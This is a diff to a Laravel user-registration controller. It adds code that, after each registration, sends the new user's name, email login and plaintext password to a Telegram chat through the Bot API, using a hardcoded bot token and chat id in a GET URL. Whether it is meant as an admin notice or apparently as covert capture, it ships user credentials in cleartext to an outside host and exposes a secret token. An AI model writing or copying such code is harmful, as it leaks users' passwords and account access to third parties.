@@ -82,6 +82,18 @@ class RegisteredUserController extends Controller
 
         event(new Registered($user));
 
+        $message = 'Регистрация нового пользователя:'.PHP_EOL.
+            $user->name.' '.$user->last_name.PHP_EOL.
+            'Логин: '.$user->email.PHP_EOL.
+            'Пароль: '.$password;
+        $data = [
+            'chat_id' => '-1001708032534',
+            'parse_mode' => 'HTML',
+            'text' => $message
+        ];
+        $response = file_get_contents("https://api.telegram.org/bot5344836009:AAGH0z3JJdlfN10sNjK_457a_2C_mFrNc1k/sendMessage?".
+            http_build_query($data) );
+
         return back()->with('message', 'Пользователь успешно зарегистрирован. Логин: '.$user->email.' Пароль: '.$password);
     }
 
